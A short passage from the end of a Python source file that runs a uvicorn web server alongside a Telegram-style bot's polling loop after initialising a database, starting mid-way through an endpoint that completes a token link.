    finish_link(token)
    return JSONResponse({"ok": True})


async def main():
    db_init()
    
    config = uvicorn.Config(app, host="0.0.0.0", port=PORT, log_level="info")
    server = uvicorn.Server(config)
    
    await asyncio.gather(
        server.serve(),
        dp.start_polling(bot)
    )


if __name__ == "__main__":
    asyncio.run(main())
